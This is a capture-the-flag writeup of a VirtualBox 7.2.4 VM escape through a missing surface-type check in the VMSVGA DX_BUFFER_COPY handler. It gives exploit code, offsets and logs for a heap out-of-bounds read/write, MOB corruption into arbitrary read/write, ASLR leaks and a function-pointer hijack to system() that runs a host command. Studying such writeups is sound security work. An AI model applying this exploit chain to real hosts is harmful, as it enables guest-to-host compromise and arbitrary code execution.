## 1. Overview

EasyVBox is a VM escape challenge that targets VirtualBox's VMSVGA 3D command handling path. The attack starts in the guest, and the goal is to launch `/usr/bin/gnome-calculator` in the L1 host's GUI session.

Running the exploit requires root privileges in the guest, or `CAP_SYS_MODULE`. That privilege is only needed to send raw SVGA3D commands. The real target is the VMSVGA object state inside the host-side `VirtualBoxVM` process.

The bug was in `SVGA_3D_CMD_DX_BUFFER_COPY`, which I will call `DX_BUFFER_COPY` below. This command is supposed to copy bytes only between `SVGA3D_BUFFER` surfaces. In VirtualBox 7.2.4 r170995, however, the handler did not check whether `src` and `dest` were actually `SVGA3D_BUFFER` surfaces.

Because that validation was missing, I could route a `SVGA3D_NV12` surface with `height=0` through the copy path. I first used that to leak host heap data and find a live `VMSVGAMOB` in the leaked buffer. Then I used the same bug in the opposite direction to patch MOB metadata. From there, the COTable path became an AAR/AAW primitive in the `VirtualBoxVM` user-space process. The final step was to replace `pfnCommandClear` with `system()` and trigger command execution.

## 2. Environment

The setup was:

- L0 / outer host: VMware Workstation
- L1 / target host: Ubuntu 24.04 Desktop, Oracle VirtualBox 7.2.4 r170995
- L2 / target guest: Ubuntu 24.04 inside VirtualBox
- Guest kernel: `6.17.0-23-generic`
- Guest Additions: installed
- Guest graphics stack: `vmwgfx` DRM path enabled
- Graphics controller: VMSVGA
- 3D Acceleration: enabled
- Helper module: standalone `/dev/vgapwn_dev`
- Secure Boot: disabled
- Goal: launch `/usr/bin/gnome-calculator` in the L1 host GUI session

The important setting is `3D Acceleration: enabled`. Without it, the guest cannot send SVGA3D commands such as surface creation, copies, readback, or COTable updates. The guest builds the commands, but the host-side `VirtualBoxVM` process handles them.

```text
Guest SVGA3D command
    -> VirtualBoxVM VMSVGA command handler
    -> host heap object creation/modification
    -> metadata corruption
```

That is the useful way to look at the challenge. The guest sends graphics commands, but the effects land on heap objects in the host process.

## 3. Objects Needed for the Attack

Only a few objects matter in this writeup.

- surface: a graphics resource defined by the guest. I keep the original term to match the code.
- MOB: an SVGA object that connects a guest resource to backing memory.
- `VMSVGAMOB`: the host-side structure that manages a MOB.
- `VMSVGAGBO`: backing metadata for a MOB. For this exploit, only `pvHost` and `cbTotal` matter.
- COTable: normally used to synchronize DX object tables. With a corrupted MOB, it becomes AAR/AAW.

The final target is `pFuncsVGPU9->pfnCommandClear`, the handler slot used when `SVGA_3D_CMD_CLEAR` is submitted.

## 4. Root Cause

Start with the `DX_BUFFER_COPY` payload.

```c
typedef struct SVGA3dCmdDXBufferCopy {
    SVGA3dSurfaceId dest;
    SVGA3dSurfaceId src;
    uint32 destX;
    uint32 srcX;
    uint32 width;
} SVGA3dCmdDXBufferCopy;
```

The payload has no `height` or `depth` field. The handler obtains `box.h/.d` while mapping the `src` and `dest` surfaces.

A valid buffer copy needs these conditions:

- source format == `SVGA3D_BUFFER`
- destination format == `SVGA3D_BUFFER`
- source box `h == 1 && d == 1`
- destination box `h == 1 && d == 1`

VirtualBox 7.2.6 checks those conditions. VirtualBox 7.2.4 did not.

```c
if (   mapBufferSrc.format == SVGA3D_BUFFER && mapBufferSrc.box.h == 1 && mapBufferSrc.box.d == 1
    && mapBufferDest.format == SVGA3D_BUFFER && mapBufferDest.box.h == 1 && mapBufferDest.box.d == 1)
{
    uint8_t const *pu8BufferSrc = (uint8_t *)mapBufferSrc.pvData;
    uint32_t const cbBufferSrc = mapBufferSrc.cbRow;

    uint8_t *pu8BufferDest = (uint8_t *)mapBufferDest.pvData;
    uint32_t const cbBufferDest = mapBufferDest.cbRow;

    if (   pCmd->srcX < cbBufferSrc
        && pCmd->width <= cbBufferSrc - pCmd->srcX
        && pCmd->destX < cbBufferDest
        && pCmd->width <= cbBufferDest - pCmd->destX)
        memcpy(&pu8BufferDest[pCmd->destX],
               &pu8BufferSrc[pCmd->srcX],
               pCmd->width);
}
```

In 7.2.4, reaching `memcpy` only required `srcX`, `destX`, `width`, and `cbRow` to line up.

The surface combination I used was:

- source: `SVGA3D_NV12`, `w=0x1000`, `h=0`, `d=1`
- destination: `SVGA3D_LUMINANCE8`, `w=0x1000`, `h=1`, `d=1`
- copy width: `0x1000`

Neither surface is `SVGA3D_BUFFER`. Version 7.2.6 rejects this, but version 7.2.4 lets it enter the copy path.

The trick is `height=0`. The backing allocation becomes almost empty, but the mapped `cbRow` still comes from the width. That allows a `memcpy` larger than the actual allocation.

```text
height=0 NV12 surface
    -> tiny backing allocation
    -> cbRow still based on width
    -> DX_BUFFER_COPY width check passes
    -> host heap OOB read/write
```

## 5. Sending Commands

To send arbitrary SVGA3D commands, I used a standalone helper module. I did not replace `vmwgfx`. I only reused the reserve/commit path from the already loaded `vmwgfx` driver.

```c
cmd = p_vmw_cmd_ctx_reserve(dev_ref, size, SVGA3D_INVALID_ID);
copy_from_user(cmd, buf, size);

if (use_commit_flush)
    p_vmw_cmd_commit_flush(dev_ref, size);
else
    p_vmw_cmd_commit(dev_ref, size);
```

On the remote environment, `use_commit_flush=1` was necessary. COTable readback sometimes returned stale data, and flushing made the synchronization reliable.

## 6. First OOB Read

The bug does not immediately give a strong read/write primitive. I first needed a host heap leak. I created a `height=0` surface with almost no backing storage, then placed a marker MOB after it.

```c
define_surface(transfer_id, buf_size, 1, 1, SVGA3D_LUMINANCE8);
define_gmob(transfer_id, transfer_phys, buf_size);
bind_surface(transfer_id, transfer_id);

define_surface(sid, buf_size, 0, 1, SVGA3D_NV12);
buffer_copy(sid, transfer_id, 1);

define_gmob(sid, transfer_phys, 0x01421337);

buffer_copy(sid, transfer_id, buf_size);
readback_surface(transfer_id);
read_transfer_buffer(buf, buf_size);
```

The layout is roughly:

```text
[ height=0 NV12 backing ][ host heap ... ][ marker VMSVGAMOB ]
             |
             +-- DX_BUFFER_COPY --> transfer surface
```

The first `buffer_copy(..., 1)` prepares the mapping path. The second `buffer_copy(..., buf_size)` performs the actual OOB read. The result lands in `transfer_surface`, then `readback_surface()` makes it readable from the guest buffer.

## 7. Finding a Live MOB

A leak alone is not enough. I needed a live `VMSVGAMOB` that I could corrupt later.

The marker was `0x01421337`, written into `VMSVGAMOB.Gbo.cbTotal`. I searched for that value in the leak buffer, then subtracted `offsetof(VMSVGAMOB, Gbo.cbTotal)` to recover candidate MOB starts.

```c
uint64_t marker_off = offsetof(VMSVGAMOB, Gbo.cbTotal);

for (uint32_t pos = 0; pos + 3 < GROOM_SCAN_LIMIT; pos++) {
    if (buf[pos] != 0x37 || buf[pos + 1] != 0x13 ||
        buf[pos + 2] != 0x42 || buf[pos + 3] != 0x01)
        continue;
    if (pos < marker_off)
        continue;

    uint64_t mob_offset = pos - marker_off;
    VMSVGAMOB *mob = (VMSVGAMOB *)(snapshot + mob_offset);

    if (mob->Core.Key != sid)
        continue;

    save_candidate(sid, pos, mob_offset, snapshot);
}
```

The marker is only a hint. The leaked heap can contain stale freed objects. When I widened the scan range, I picked up a bad marker around `0x2b0`, and the exploit later broke during state leakage.

So I used four checks before trusting a candidate.

- `Core.Key == sid`
- whether it becomes a host-backed MOB after attaching it to COTable
- whether the COTable round-trip check succeeds
- whether OOB write-back succeeds

For the remote preset, I only scanned the early candidates.

```text
GROOM_SCAN_LIMIT=0x100
GROOM_COLLECT_CANDIDATES=2
```

## 8. Fixing the MOB with OOB Write

The same bug works in the opposite direction. For the leak, I copied from the area after the `height=0` surface. For corruption, I reversed the copy direction and pushed modified bytes into the host heap.

1. Locate the target `VMSVGAMOB` in the leak snapshot.
2. Patch `Gbo.cbTotal`, `Gbo.pvHost`, and `fGboFlags` inside the snapshot.
3. Upload the modified bytes to `transfer_surface`.
4. Send `DX_BUFFER_COPY(src=transfer_surface, dst=height0_surface)`.
5. The bytes are written past the `height=0` backing allocation into the heap.

```c
static int corrupt_host_gmob(ctx_t *ctx)
{
    transfer_write(ctx, ctx->corrupted_mob_buffer, ctx->corrupt_size);
    dx_update_subresource(ctx->transfer_surface_id, ctx->corrupt_size);

    return dx_buffer_copy(ctx->transfer_surface_id,
                          ctx->groomed_surface,
                          ctx->corrupt_size);
}
```

`DX_UPDATE_SUBRESOURCE` is only the preparation step. The actual overwrite happens in the following `DX_BUFFER_COPY`.

The important fields are:

- `Gbo.cbTotal`: copy size
- `Gbo.pvHost`: host backing pointer
- `fGboFlags`: keeps the host-backed path active. In this build, I observed `0x2`.

I verified that the write reached a live object by reading it back.

```text
[.] verifying OOB write-back against candidate 0 with pvHost=0x71b31c7d6768
[.] MOB key=24856 ... flags=0x2 cb=0x20 pvHost=0x71b31c7d6768
[+] candidate 0 OOB write-back verified
```

## 9. Building AAR/AAW with COTable

At this point, I could control `Gbo.pvHost` and `Gbo.cbTotal`. COTable readback, update, and grow paths use this MOB as backing storage. That turns the normal COTable behavior into AAR/AAW inside the `VirtualBoxVM` user-space process.

This is not host kernel read/write. The range is the user-space address space of the `VirtualBoxVM` process.

The structure layout below is what I observed on the VirtualBox 7.2.4 r170995 Ubuntu/stub build. It can differ on other builds.

```c
typedef struct VMSVGAGBO
{
    uint32_t  fGboFlags;
    uint32_t  cTotalPages;
    uint32_t  cbTotal;
    uint32_t  cSegsUsed;
    void     *pvDescriptors;
    uint64_t *paGCPhysPages;
    void     *paPageLocks;
    void    **papvPages;
    void     *paSegs;
    void     *pvHost;
} VMSVGAGBO;

typedef struct VMSVGAMOB
{
    AVLU32NODECORE Core;
    RTLISTNODE     nodeLRU;
    VMSVGAGBO      Gbo;
} VMSVGAMOB;
```

The read primitive becomes:

```c
int aar(ctx_t *ctx, uint64_t host_addr, void *out, size_t size)
{
    mob_set_pvhost(ctx, ctx->corrupted_mob, host_addr);
    mob_set_cbtotal(ctx, ctx->corrupted_mob, size);

    dx_readback_cotable(ctx, ctx->cotable_id);
    read_transfer_buffer(ctx, out, size);

    return 0;
}
```

The write primitive is the reverse path:

```c
int aaw(ctx_t *ctx, uint64_t host_addr, const void *data, size_t size)
{
    write_transfer_buffer(ctx, data, size);

    mob_set_pvhost(ctx, ctx->corrupted_mob, host_addr);
    mob_set_cbtotal(ctx, ctx->corrupted_mob, size);

    dx_update_cotable(ctx, ctx->cotable_id);

    return 0;
}
```

Every risky write was verified by reading it back.

```c
static int write_checked(ctx_t *ctx, uint64_t addr,
                         const void *contents, size_t size,
                         const char *label)
{
    uint8_t verify[MAX_VERIFY_SIZE];

    arbitrary_write(ctx, addr, contents, size);
    arbitrary_read(ctx, addr, verify, size);

    return memcmp(verify, contents, size) == 0 ? 0 : -1;
}
```

## 10. Leaking the State Structure

Once AAR/AAW was ready, the next problem was ASLR. The starting point was `VMSVGAMOB.nodeLRU`.

```text
corrupted_mob->nodeLRU
    -> MOBLRUList anchor
    -> PVMSVGAR3STATE
    -> pFuncsVGPU9
    -> pfnCommandClear
    -> VBoxDD.so base
    -> libc base
```

The offsets used for the remote build were:

```text
MOBLRUList anchor      = candidate anchor
PVMSVGAR3STATE         = anchor - 0x12d0
pFuncsVGPU9 field      = PVMSVGAR3STATE + 0x12f0
pfnCommandClear slot   = pFuncsVGPU9 + 0x60
```

I did not choose a candidate pointer by range alone. I checked that `pfnCommandClear` was a code pointer inside `VBoxDD.so`, then walked down page by page until I found the ELF magic.

```c
uint64_t clear_pfn = aar64(ctx, pfuncs_vgpu9 + OFF_COMMAND_CLEAR);

if (!looks_like_code_ptr(clear_pfn))
    reject_candidate();

uint64_t vboxdd_base = clear_pfn & ~0xfffULL;

while (vboxdd_base > clear_pfn - MAX_MODULE_SCAN) {
    uint32_t magic = aar32(ctx, vboxdd_base);

    if (magic == 0x464c457f)   // "\x7fELF"
        break;

    vboxdd_base -= 0x1000;
}
```

The remote run logged this:

```text
[+] selected groom candidate 0 via direct LRU anchor
[.] MOBLRUList anchor addr: 0x71b32c1ee7a0
[.] PVMSVGAR3STATE addr: 0x71b32c1ed4d0
[+] pFuncsVGPU9 field: 0x71b32c1ee7c0
[+] pFuncsVGPU9 table: 0x71b32c2bf030
[+] command clear function pointer: 0x71b33170e840
[+] vboxdd base: 0x71b331600000 (stub-ubuntu)
```

After getting the `VBoxDD.so` base, I read `write@GOT` and calculated the libc base. This assumes the challenge image uses a fixed libc build and that the GOT entry already holds the resolved `write` address.

```text
[+] pDevIns: 0x71b37002e000, pThisCC: 0x71b37002e180
[+] libc write: 0x71b386b1c590, libc base: 0x71b386a00000, system: 0x71b386a58750
```

## 11. Code Execution

The final step was hijacking `pFuncsVGPU9->pfnCommandClear`. I did not need ROP.

The clear handler call site in VirtualBox 7.2.4 is roughly:

```c
return pSvgaR3State->pFuncsVGPU9->pfnCommandClear(
    pThisCC, cid, clearFlag, color, depth, stencil, cRects, pRect);
```

On x86_64 SysV ABI, the first argument is passed in `RDI`. If `pfnCommandClear` is replaced with `system`, the call effectively becomes:

```text
system(pThisCC)
```

So I wrote the command string into `pThisCC`, temporarily replaced the handler pointer, and submitted `SVGA_3D_CMD_CLEAR`.

```c
uint64_t original = aar64(ctx, command_clear_pfn_addr);

write_checked(ctx, command_clear_pfn_addr, &system_addr, 8,
              "command clear handler");

write_checked(ctx, pthiscc, command, strlen(command) + 1,
              "command string");

submit_clear_command(ctx);

write_checked(ctx, command_clear_pfn_addr, &original, 8,
              "command clear restore");
```

The state changes like this:

```text
before  : pfnCommandClear -> original VBoxDD.so handler
after   : pfnCommandClear -> libc system
argument: pThisCC -> "/usr/bin/gnome-calculator&"
trigger : SVGA_3D_CMD_CLEAR
restore : pfnCommandClear -> original handler
```

I did not restore the bytes at `pThisCC`. The goal was a one-time launch of the host calculator. I did restore the handler pointer immediately, and verified that write by reading it back.

## 12. Stability

For the remote environment, I kept these rules:

- run the final exploit only once on a fresh snapshot
- do not run the final exploit in the same boot after exploration runs
- load the helper with `use_commit_flush=1`
- do not trust marker discovery alone; verify COTable round-trip and OOB write-back
- use early markers instead of a wide scan
- verify handler overwrite, command string write, and restore by reading them back

The final preset values were:

```text
GROOM_SCAN_LIMIT=0x100
GROOM_COLLECT_CANDIDATES=2
GROOM_VALIDATE_COTABLE=1
VALIDATE_COTABLE_IO=1
```

I uploaded three files:

```text
exploit
vgapwn-standalone-6.17.0-23-generic.ko
run_final.sh
```

`run_final.sh` leaves a marker file so the final exploit is not run twice on the same snapshot.

```bash
if [ -e .easyvbox_attempted ]; then
    echo "final attempt marker already exists; ask for a snapshot restore before retrying."
    exit 1
fi
touch .easyvbox_attempted

PWN_REMOTE_PRESET=1 PWN_CMD="${PWN_CMD:-/usr/bin/gnome-calculator&}" ./exploit
```

## 13. Result

The final run was done on a fresh snapshot.

```bash
PWN_REMOTE_PRESET=1 PWN_CMD="/usr/bin/gnome-calculator&" ./exploit
```

Candidate discovery and primitive validation succeeded.

```text
[+] candidate 0: surface 6118 marker 50, MOB offset 20, key=24856
[+] candidate 0 passed early COTable validation
[+] candidate 1: surface 6120 marker 50, MOB offset 20, key=24864
[+] candidate 1 passed early COTable validation
[+] collected 2 groom candidate(s), last surface 6120

[+] candidate 0 COTable round-trip verified
[+] candidate 0 OOB write-back verified
[+] selected groom candidate 0 via direct LRU anchor
[.] Primitives ready for exploitation
```

The handler overwrite, command string write, and restore were also verified by reading them back.

```text
[+] verified command clear handler write
[+] verified command string write
[.] Triggering system command...
[.] Restoring command clear handler
[+] verified command clear restore write
```

After the log reached this point, a calculator window appeared on the host screen.

![](image.png)
